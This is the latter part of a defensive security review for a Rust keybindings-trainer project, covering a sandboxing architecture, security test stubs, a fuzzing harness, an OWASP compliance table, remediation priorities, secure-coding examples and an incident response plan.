    open-pull-requests-limit: 5
```

---

## 3. Architecture Security Improvements

### Recommended Security Architecture

```
┌─────────────────────────────────────────────┐
│         Security Boundary                    │
│  ┌───────────────────────────────────────┐  │
│  │  TUI Layer (User Input Validation)    │  │
│  │  - Input sanitization                 │  │
│  │  - Command rate limiting              │  │
│  │  - Display sanitization               │  │
│  └─────────────┬─────────────────────────┘  │
│                │                             │
│  ┌─────────────▼─────────────────────────┐  │
│  │  Game Engine (Business Logic)         │  │
│  │  - Resource limits                    │  │
│  │  - Safe scoring calculations          │  │
│  │  - Session timeout                    │  │
│  └─────────────┬─────────────────────────┘  │
│                │                             │
│  ┌─────────────▼─────────────────────────┐  │
│  │  Security Layer (Validation)          │  │
│  │  - Path validation                    │  │
│  │  - Content sanitization               │  │
│  │  - Permission checks                  │  │
│  └─────────────┬─────────────────────────┘  │
│                │                             │
│  ┌─────────────▼─────────────────────────┐  │
│  │  Sandboxed PTY Controller             │  │
│  │  - Minimal environment                │  │
│  │  - Dropped privileges                 │  │
│  │  - Process isolation                  │  │
│  │  - Timeout enforcement                │  │
│  └─────────────┬─────────────────────────┘  │
│                │                             │
│  ┌─────────────▼─────────────────────────┐  │
│  │  Secure Temp File Manager             │  │
│  │  - Restrictive permissions            │  │
│  │  - Automatic cleanup                  │  │
│  │  - Symlink protection                 │  │
│  └───────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
             │
             ▼
    ┌────────────────┐
    │  Helix Process │  (Sandboxed)
    └────────────────┘
```

### Security Layers

**Layer 1: Input Validation**
- Validate all user input at entry points
- Sanitize terminal output
- Rate limiting on operations

**Layer 2: Business Logic Security**
- Safe arithmetic operations
- Resource limits
- Timeout enforcement

**Layer 3: Validation & Authorization**
- Path traversal prevention
- Content sanitization
- Permission checks

**Layer 4: Isolation & Sandboxing**
- Process isolation
- Minimal environment
- Dropped privileges

---

## 4. Testing Recommendations

### Security Test Suite

```rust
// tests/security_tests.rs

mod path_security {
    #[test]
    fn test_directory_traversal_attacks() { }

    #[test]
    fn test_symlink_following() { }

    #[test]
    fn test_absolute_path_injection() { }
}

mod input_validation {
    #[test]
    fn test_malicious_toml_parsing() { }

    #[test]
    fn test_oversized_content() { }

    #[test]
    fn test_special_characters_in_ids() { }

    #[test]
    fn test_escape_sequence_injection() { }
}

mod process_security {
    #[test]
    fn test_command_injection() { }

    #[test]
    fn test_environment_variable_isolation() { }

    #[test]
    fn test_process_cleanup() { }

    #[test]
    fn test_privilege_dropping() { }
}

mod resource_limits {
    #[test]
    fn test_memory_exhaustion_prevention() { }

    #[test]
    fn test_file_descriptor_limits() { }

    #[test]
    fn test_concurrent_session_limits() { }
}

mod cryptographic {
    // If adding any crypto in future
    #[test]
    fn test_secure_random_generation() { }
}
```

### Fuzzing Strategy

```rust
// fuzz/fuzz_targets/scenario_parser.rs
#![no_main]
use libfuzzer_sys::fuzz_target;

fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = toml::from_str::<Vec<Scenario>>(s);
    }
});

// Add to Cargo.toml:
// [dev-dependencies]
// cargo-fuzz = "0.11"
```

### Penetration Testing Checklist

- [ ] Path traversal attempts
- [ ] Command injection vectors
- [ ] TOML parsing with malformed input
- [ ] Resource exhaustion attacks
- [ ] Race condition exploitation
- [ ] Terminal escape sequence injection
- [ ] Privilege escalation attempts
- [ ] Information disclosure via logs

---

## 5. Compliance Considerations

### OWASP Top 10 (2021) Compliance

| Risk | Status | Mitigation |
|------|--------|------------|
| A01: Broken Access Control | ⚠️ NEEDS WORK | Implement path validation, permission checks |
| A02: Cryptographic Failures | ✅ N/A | No sensitive data stored currently |
| A03: Injection | ⚠️ HIGH RISK | Command injection prevention critical |
| A04: Insecure Design | ⚠️ NEEDS WORK | Add security layer, sandboxing |
| A05: Security Misconfiguration | ⚠️ NEEDS WORK | Secure defaults, minimize permissions |
| A06: Vulnerable Components | ✅ OK | Regular dependency audits needed |
| A07: Auth Failures | ✅ N/A | No authentication currently |
| A08: Software/Data Integrity | ⚠️ NEEDS WORK | Validate scenario files |
| A09: Logging Failures | ⚠️ NEEDS WORK | Implement secure logging |
| A10: SSRF | ✅ N/A | No network requests |

---

## 6. Implementation Priority

### Phase 1: Critical Security (Before MVP Release)

**Priority: CRITICAL**

1. **Command Injection Prevention** (C-01)
   - Implement secure process spawning
   - Input validation for all external data
   - Environment variable isolation

2. **TOML Deserialization Security** (C-02)
   - Size limits and validation
   - Schema enforcement
   - Content sanitization

3. **Path Traversal Prevention** (H-01)
   - Path validation system
   - Allowed directory whitelist
   - Canonicalization checks

### Phase 2: High Priority (Before Helix Integration)

**Priority: HIGH**

4. **Secure Temporary Files** (H-02)
   - Use tempfile crate
   - Restrictive permissions
   - Automatic cleanup

5. **Process Management** (H-03)
   - Privilege dropping
   - Timeout enforcement
   - Zombie process prevention

6. **Secure Logging** (H-04)
   - Sanitize log output
   - Configure log levels
   - Separate internal/external errors

### Phase 3: Medium Priority (Before Production)

**Priority: MEDIUM**

7. **Input Validation** (M-01)
8. **Resource Limits** (M-02)
9. **Safe Arithmetic** (M-03)
10. **Race Condition Prevention** (M-04)
11. **Terminal Sanitization** (M-05)
12. **Error Handling** (M-06)

### Phase 4: Hardening (Continuous)

**Priority: LOW**

13. **Dependency Management** (L-01)
14. **Security Documentation** (L-02)
15. **Security Tests** (L-03)
16. **Rate Limiting** (L-04)
17. **Debug Protection** (L-05)

---

## 7. Security Development Guidelines

### Secure Coding Practices

**Rust Safety Rules**:

```rust
// ❌ NEVER use unwrap() in production
let value = risky_operation().unwrap();

// ✅ ALWAYS handle errors properly
let value = risky_operation()
    .map_err(|e| SecurityError::OperationFailed)?;

// ❌ NEVER use unchecked indexing
let item = list[user_index];

// ✅ ALWAYS validate bounds
let item = list.get(user_index)
    .ok_or(SecurityError::IndexOutOfBounds)?;

// ❌ NEVER trust external input
let path = Path::new(&user_input);
std::fs::read(path)?;

// ✅ ALWAYS validate external input
let path = validate_path(&user_input)?;
std::fs::read(path)?;
```

### Code Review Checklist

- [ ] All user input validated
- [ ] No unwrap() or expect() in production paths
- [ ] Bounds checking on array access
- [ ] Overflow protection on arithmetic
- [ ] Proper error handling
- [ ] Sensitive data not logged
- [ ] Resources properly cleaned up
- [ ] No hardcoded secrets
- [ ] Dependencies up to date
- [ ] Security tests added

---

## 8. Incident Response Plan

### Security Incident Classification

**Critical**: Command injection, arbitrary code execution
**High**: Path traversal, privilege escalation
**Medium**: DoS, information disclosure
**Low**: Minor configuration issues

### Response Procedure

1. **Detection**
   - Monitor logs for suspicious activity
   - User reports of unexpected behavior
   - Automated security testing alerts

2. **Containment**
   - Disable affected feature if necessary
   - Publish security advisory
   - Prepare patch

3. **Remediation**
   - Develop and test fix
   - Security review of fix
   - Deploy patch

4. **Recovery**
   - Verify fix effectiveness
   - Monitor for recurrence
   - Update security tests

5. **Post-Incident**
   - Root cause analysis
   - Update security guidelines
   - Improve detection mechanisms

---

## 9. Security Metrics

### Key Performance Indicators

**Code Quality**:
- Clippy warnings: 0 (target)
- cargo audit issues: 0 (target)
- Test coverage: >80% (target)
- Security test coverage: >60% (target)

**Vulnerability Management**:
- Time to patch critical: <24 hours
- Time to patch high: <7 days
- Time to patch medium: <30 days

**Process Metrics**:
- Security reviews per release: 1
- Dependency audits per month: 4
- Penetration tests per release: 1

---

## 10. Conclusion

### Current Security Posture

The Helix Keybindings Trainer project is in early development with minimal security risk in current state. However, the planned architecture introduces significant security considerations, particularly around:

1. **PTY/subprocess management** (command injection risk)
2. **TOML deserialization** (malicious input risk)
3. **File system access** (path traversal risk)

### Recommended Actions

**Immediate (Before Next Commit)**:
1. Create SECURITY.md documentation
2. Add cargo-audit to development workflow
3. Implement basic error types (SecurityError, UserError)

**Short-term (Before Task 1.2)**:
1. Implement path validation system
2. Add TOML validation with size limits
3. Create security test suite skeleton

**Medium-term (Before Task 2.1)**:
1. Implement secure process spawning
2. Add privilege dropping
3. Create secure temporary file manager
4. Add comprehensive security tests

**Long-term (Continuous)**:
1. Regular dependency audits
2. Penetration testing
3. Security documentation maintenance
4. Community security review

### Risk Assessment

**Without Recommended Mitigations**: HIGH RISK
**With Phase 1 Mitigations**: MEDIUM RISK
**With All Mitigations**: LOW RISK

The project has good foundations with safe Rust patterns, but requires security-focused implementation of the PTY controller and input validation systems to be production-ready.

---

## Appendix A: Security Error Definitions

See implementation in findings above for complete `SecurityError` enum definition.

## Appendix B: Security Testing Examples

See Section 4 for complete test suite examples.

## Appendix C: Recommended Dependencies

See Section 2 for complete dependency recommendations.

---

**Report End**

For questions or clarifications regarding this security review, please contact the security team.
